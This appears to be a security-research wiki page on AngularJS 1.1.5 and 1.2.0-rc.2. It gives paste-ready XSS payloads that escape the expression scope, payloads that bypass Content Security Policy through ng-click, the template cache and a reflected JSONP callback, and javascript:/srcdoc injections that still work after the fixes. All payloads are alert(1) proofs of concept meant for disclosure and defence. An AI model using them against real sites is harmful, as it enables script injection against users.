#summary AngularJS Security, XSS and CSP Bypasses

<wiki:toc max_depth="2" />

= Introduction =

"AngularJS is an open-source !JavaScript framework, maintained by Google, that assists with running single-page applications. Its goal is to augment browser-based applications with model–view–controller (MVC) capability, in an effort to make both development and testing easier.

The library reads in HTML that contains additional custom tag attributes; it then obeys the directives in those custom attributes, and binds input or output parts of the page to a model represented by standard !JavaScript variables. The values of those JavaScript variables can be manually set, or retrieved from static or dynamic JSON resources."

From http://en.wikipedia.org/wiki/AngularJS

= Quick Facts =

 * [http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.js AngularJS 1.1.5 (Uncompressed)]
 * Supports CSP
 * Maintained by Google
 * Security contact available via security@angularjs.org
 * Usage Stats http://trends.builtwith.com/javascript/Angular-JS

 * *{}SEC-A* <font color="orange">*FAIL*</font> Template expressions are equivalent to `eval` (fixed in RC versions)
 * *{}SEC-B* <font color="red">*FAIL*</font> Isolated execution scope exists, yet fails as sandbox
 * *{}SEC-C* <font color="red">*FAIL*</font> Anything can execute !JavaScript. Attributes, curlies, encoded curlies, you name it! 
 * *{}SEC-D* <font color="red">*FAIL*</font> No enforced separation, possible though and documented. Close fail on a tough requirement.
 * *{}SEC-E* <font color="green">*PASS*</font> A security@angularjs.org address is in place
 * *{}SEC-F* <font color="orange">*FAIL*</font> A special CSP-mode can be activated. While this is great, it re-enables injection attacks against Angular-driven websites
= Injection Attacks =

AngularJS offers frontend developers a scope object that attempts to isolate global variables from the templating work-flow and keep things lean and "Angular-only". This makes sense - and to be fair, the AngularJS documentation explicitly states that the scope object is not considered to be a sandbox. And indeed it is none. With a simple !JavaScript trick one can break out of this "non-sandbox" and execute arbitrary code in window and other host objects.

== XSS in Template ==

As can be seen in the "paste-and-go"-ready code examples: once an attacker controls the content of the `ng-app` block, almost arbitrary script execution is possible. Everything inside `{{` and `}}` is treated as AngularJS expression and with the mentioned trick we can break out our scope and get access to `window`.

{{{
<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
<div class="ng-app">
{{constructor.constructor('alert(1)')()}}
</div>
}}}

== HTML-encoded XSS in Template ==

AngularJS has no mercy for developers who like to secure their applications by properly encoding user generated data. As the following example shows, even HTML-encoded curlies allow payload execution. 

{{{
<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
<div class="ng-app">
&#x7b;&#x7b;constructor.constructor('alert(1)')()&#x7d;&#x7d;
</div>
}}}

And just to be on the safe side, AngularJS executes the alert twice.

== XSS via class-attribute ==

{{{
<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
<div class="ng-app">
    <b class="ng-style: {x:constructor.constructor('alert(1)')()};" />
</div>
}}}

== XSS via data attributes ==

{{{
<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
<b data-ng-app data-ng-style="constructor.constructor('alert(1)')()" />
}}}

= CSP Bypasses with AngularJS =

AngularJS is one of the very few - if not the only - MVC frameworks that has an explicit CSP mode. That means, developers can use the powerful templating engine despite the restrictions on eval and Function CSP imposes.

That nevertheless bears risks and leads to an interesting phenomenon: In case an attacker can inject HTML into an AngularJS application context, the injected JavaScript will be executed although CSP should protect from this. in other words: AngularJS brings inline-JavaScript on CSP-protected websites back - by using its own attributes and a complex string parsing and event binding mechanism we will discuss later on this page.

== XSS via Click & Hover (ng-click & ng-mouseover attribute) ==

{{{
<?php
header('X-Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('X-Webkit-CSP: default-src \'self\' ajax.googleapis.com');
header('Set-Cookie: abc=123');
?><!doctype html>
<html ng-app ng-csp>
<head>
<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
</head>
<body ng-click="$event.view.alert(1)">
	Click me
	<h1 ng-mouseover="$event.target.ownerDocument.defaultView.alert(2)">Hover me</h1>
</body>
}}}

== XSS via Click (data-ng-click attribute) ==

{{{
<?php
header('X-Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('X-Webkit-CSP: default-src \'self\' ajax.googleapis.com');
header('Set-Cookie: abc=123');
?><!doctype html>
<html ng-app ng-csp>
<head>
<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
</head>
<body data-ng-click="$event.view.alert(1)" onclick="alert(2)">Click me</body>
}}}

== XSS via Template Cache ==

{{{
<?php
header('X-Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('X-Webkit-CSP: default-src \'self\' ajax.googleapis.com');
header('Set-Cookie: abc=123');
?><!doctype html>
<html ng-csp ng-app="foo">
<head>
<script
src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
<script src="test.js"></script>
</head>
<body>
<div>
  <ng-include src="'one.html'"></ng-include>
</div>
</body>
</html>
}}}

test.js
{{{
var foo = angular.module("foo", []);
foo.run(['$templateCache', function($templateCache) {
    $templateCache.put('one.html', '<h1 data-ng-click="$event.view.alert(1)">Click me</h1>');
}]);
}}}

== XSS on Hover with CSS-based Overlay ==

{{{
var foo = angular.module("foo", []);
foo.run(['$templateCache', function($templateCache) {
    $templateCache.put('one.html', '<h1 data-ng-style="{border: \'1000px solid red\'}" data-ng-mouseover="$event.view.alert(1)">Click me</h1>');
}]);
}}}

== XSS via JSON Callback ==

{{{
<?php
header('X-Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('X-Webkit-CSP: default-src \'self\' ajax.googleapis.com');
header('Set-Cookie: abc=123');
?><!doctype html>
<html ng-app ng-csp>
<head>
<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
<script src="test.js"></script>
</head>
<body>
<div ng-controller="FetchCtrl">
<input type="text" ng-model="url" size="80" />
<button ng-click="fetch()">fetch</button>
</div>
</body>
</html>
}}}

test.js
{{{
function FetchCtrl($scope, $http, $templateCache) {
    $scope.method = 'JSONP';
    $scope.fetch = function() {
    $scope.code = null;
    $scope.response = null;
    $http({method: $scope.method, url: $scope.url, cache: $templateCache}).
    	success(function(data, status) {
    		$scope.status = status;
    		$scope.data = data;
    	})
    };
    $scope.updateModel = function(method, url) {
    	$scope.method = method;
    	$scope.url = url;
 	};
}
function foo(){
	alert('JSON callback received')
}
}}}

test.json
{{{
<?php echo $_GET['callback']; ?>({"name":"Super Hero","salutation":"Namaskar","greeting":"Namaskar Super Hero!"});
}}}

== Eval via Function (no CSP) ==

Below we can see the code that causes the XSS (in non-CSP modes). Again the framework makes extensive use of implicit `eval` using the `Function` constructor:

{{{
    function getterFn(path, csp) {
        if (getterFnCache.hasOwnProperty(path)) {
            return getterFnCache[path];
        }
        
        var pathKeys = path.split('.'), 
        pathKeysLength = pathKeys.length, 
        fn;
        
        if (csp) {
            fn = (pathKeysLength < 6) 
            ? cspSafeGetterFn(pathKeys[0], pathKeys[1], pathKeys[2], pathKeys[3], pathKeys[4]) 
            : function(scope, locals) {
                var i = 0, val;
                do {
                    val = cspSafeGetterFn(
                    pathKeys[i++], pathKeys[i++], pathKeys[i++], pathKeys[i++], pathKeys[i++]
                    )(scope, locals);
                    
                    locals = undefined; // clear after first iteration
                    scope = val;
                } while (i < pathKeysLength);
                return val;
            }
        } else {
            var code = 'var l, fn, p;\n';
            forEach(pathKeys, function(key, index) {
                code += 'if(s === null || s === undefined) return s;\n' + 
                'l=s;\n' + 
                's=' + (index 
                // we simply dereference 's' on any .dot notation
                ? 's' 
                // but if we are first then we check locals first, and if so read it first
                : '((k&&k.hasOwnProperty("' + key + '"))?k:s)') + '["' + key + '"]' + ';\n' + 
                'if (s && s.then) {\n' + 
                ' if (!("$$v" in s)) {\n' + 
                ' p=s;\n' + 
                ' p.$$v = undefined;\n' + 
                ' p.then(function(v) {p.$$v=v;});\n' + 
                '}\n' + 
                ' s=s.$$v\n' + 
                '}\n';
            });
            code += 'return s;';
            fn = Function('s', 'k', code); // s=scope, k=locals
            fn.toString = function() {
                return code;
            };
        }
        
        return getterFnCache[path] = fn;
    }
}}}

== "Eval" via Event Binding (using CSP) ==

More interesting is the way how AngularJS enables inline JavaScript despite restrictive CSP headers being in place. On initialization of the page, AngularJS walks over all event-handling attributes and binds the matching event. Then, upon execution of the event, the content of the attribute is being parsed,tested for validity and ultimately executed. Using events, the parser and direct object access, AngularJS manages to perform a "string-to-code" without using any `eval` or `Function`. Templating despite CSP works - but injection work as well.

{{{
var ngEventDirectives = {};
forEach(
  'click dblclick mousedown mouseup mouseover mouseout mousemove mouseenter mouseleave keydown keyup keypress'.split(' '),
  function(name) {
    var directiveName = directiveNormalize('ng-' + name);
    ngEventDirectives[directiveName] = ['$parse', function($parse) {
      return function(scope, element, attr) {
        var fn = $parse(attr[directiveName]);
        element.bind(lowercase(name), function(event) {
          scope.$apply(function() {
            fn(scope, {$event:event});
          });
        });
      };
    }];
  }
);

[...]

function cspSafeGetterFn(key0, key1, key2, key3, key4) {
  return function(scope, locals) {
    var pathVal = (locals && locals.hasOwnProperty(key0)) ? locals : scope,
        promise;

    if (pathVal === null || pathVal === undefined) return pathVal;

    pathVal = pathVal[key0];
    if (pathVal && pathVal.then) {
      if (!("$$v" in pathVal)) {
        promise = pathVal;
        promise.$$v = undefined;
        promise.then(function(val) { promise.$$v = val; });
      }
      pathVal = pathVal.$$v;
    }
    if (!key1 || pathVal === null || pathVal === undefined) return pathVal;

    pathVal = pathVal[key1];
    if (pathVal && pathVal.then) {
      if (!("$$v" in pathVal)) {
        promise = pathVal;
        promise.$$v = undefined;
        promise.then(function(val) { promise.$$v = val; });
      }
      pathVal = pathVal.$$v;
    }
    if (!key2 || pathVal === null || pathVal === undefined) return pathVal;

    pathVal = pathVal[key2];
    if (pathVal && pathVal.then) {
      if (!("$$v" in pathVal)) {
        promise = pathVal;
        promise.$$v = undefined;
        promise.then(function(val) { promise.$$v = val; });
      }
      pathVal = pathVal.$$v;
    }
    if (!key3 || pathVal === null || pathVal === undefined) return pathVal;

    pathVal = pathVal[key3];
    if (pathVal && pathVal.then) {
      if (!("$$v" in pathVal)) {
        promise = pathVal;
        promise.$$v = undefined;
        promise.then(function(val) { promise.$$v = val; });
      }
      pathVal = pathVal.$$v;
    }
    if (!key4 || pathVal === null || pathVal === undefined) return pathVal;

    pathVal = pathVal[key4];
    if (pathVal && pathVal.then) {
      if (!("$$v" in pathVal)) {
        promise = pathVal;
        promise.$$v = undefined;
        promise.then(function(val) { promise.$$v = val; });
      }
      pathVal = pathVal.$$v;
    }
    return pathVal;
  };
}
}}}

= AngularJS 1.2.0-rc.2 =

This currently most recent version of AngularJS has received an internal security audit and several of the aforementioned issues were fixed or mitigated. Well, several but not all of them. We cannot get a reference to a potentially dangerous object anymore - Function, window and others were black-listed. The CSP bypasses still work though.

Interestingly, even the attribute-wrappers receive sanitization. Like it's the late nineties all over again:

{{{
  var hasDirectives = {},
      Suffix = 'Directive',
      COMMENT_DIRECTIVE_REGEXP = /^\s*directive\:\s*([\d\w\-_]+)\s+(.*)$/,
      CLASS_DIRECTIVE_REGEXP = /(([\d\w\-_]+)(?:\:([^;]+))?;?)/,
      aHrefSanitizationWhitelist = /^\s*(https?|ftp|mailto|file):/,
      imgSrcSanitizationWhitelist = /^\s*(https?|ftp|file):|data:image\//;

  // Ref: http://developers.whatwg.org/webappapis.html#event-handler-idl-attributes
  // The assumption is that future DOM event attribute names will begin with
  // 'on' and be composed of only English letters.
  var EVENT_HANDLER_ATTR_REGEXP = /^(on[a-z]*|formaction)$/;
}}}

This prohibits an attacker from using JavaScript and other critical URL schemes for certain attributes - yet leaves a bunch of important attributes complete out of consideration.

Here's what we *cannot* do anymore (DOM errors will be thrown, URLs will be prefixed with the string `unsafe:`):

{{{
<html ng-app>
<head>
	<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0-rc.2/angular.min.js"></script>
</head>
<body>
	<a ng-attr-href="{{'javascript:'}}alert(1)">CLICK</a>
	<iframe ng-attr-src="{{'javascript:alert(1)'}}"></a>
</body>
}}}

And here's what we can still do:

{{{
<html ng-app>
<head>
	<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0-rc.2/angular.min.js"></script>
</head>
<body>
	<form ng-attr-action="{{'javascript:'}}alert(1)"><button>CLICK</button></form>
	<iframe ng-attr-srcdoc="{{'<img src=x onerror=alert(1)>'}}"></a>
</body>
}}}